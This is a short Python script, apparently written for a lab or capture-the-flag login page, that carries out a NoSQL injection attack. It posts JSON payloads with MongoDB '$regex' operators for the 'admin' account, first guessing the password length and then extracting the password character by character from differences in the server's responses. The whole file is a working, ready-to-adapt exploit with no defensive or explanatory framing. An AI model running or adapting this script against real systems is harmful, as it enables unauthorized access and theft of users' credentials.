#!/usr/bin/python3

from pwn import *
import requests, time, sys, signal, string

def def_handler(sig, frame):
    print("\n\n[!] Exit...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#global variables
login_url = "http://127.0.0.1/" #target url
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
position = 0

def SearchLenght():

    global position

    p1 = log.progress("Brute force")
    p1.status("Initializing")

    time.sleep(2)

    p2= log.progress("Password length")

    for position in range(0, 120):
        
        longitud = f'{{"username":"admin","password":{{"$regex":".{{{position}}}"}}}}' #user default: admin, change if you need it
        
        headers = {'Content-Type': 'application/json'}

        r = requests.post(login_url, headers=headers, data=longitud)

        if "Invalid username" in r.text: # # Replace "Invalid username" with the exact error message returned
    # when the regex payload is incorrect. Check the response in BurpSuite
    # or your browser developer tools.
            position = position -1
            p2.status(str(position) + " characters")
            break


def makeNoSQLI():

    password = ""

    p1 = log.progress("Brute force")
    p1.status("Initializing")

    time.sleep(2)

    p2= log.progress("Password")

    for posicion in range(position):
        for character in characters:

            post_data= '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password,character) #use default: admin, change if you need it

            headers = {'Content-Type': 'application/json'}

            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    SearchLenght()
    time.sleep(2)
    print("\nInitializing password discovery\n")
    time.sleep(2)
    makeNoSQLI()
